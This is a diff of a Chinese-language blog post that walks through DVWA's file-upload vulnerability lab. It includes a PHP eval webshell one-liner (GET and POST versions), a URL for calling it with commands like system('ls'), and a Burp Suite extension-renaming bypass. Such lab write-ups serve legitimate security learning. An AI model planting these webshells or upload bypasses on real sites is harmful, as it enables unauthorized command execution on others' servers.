@@ -1,6 +1,6 @@
 ---
 layout: post
-title: File Upload
+title: 文件上传漏洞
 subtitle: File Upload
 date: 2023-08-01 23:00
 author: Kyon-H
@@ -10,7 +10,6 @@ tags:
   - 靶场实战
 published: true
 ---
-# 文件上传漏洞
 ### LOW
 
 the.php
@@ -19,7 +18,7 @@ the.php
 <?php eval($_GET['bckdor'])?> 
 ```
 
-构造url: http://192.168.30.131/dvwa/hackable/uploads/the.php?bckdor=
+构造url: <http://192.168.30.131/dvwa/hackable/uploads/the.php?bckdor=>
 
 ```php
 phpinfo(); 
@@ -31,14 +30,15 @@ system('ls');
 ```php
 <?php eval($_POST['bckdor'])?>
 ```
+
 ### MEDIUM
 
 将the.php改为the.jpg
 
 ![image.png](https://img.ghostliner.top/vt5Xwv.png)
 
-
 burpsuit抓取request，修改文件后缀
+
 ### HIGH
 
 准备图片image.png和hack.php
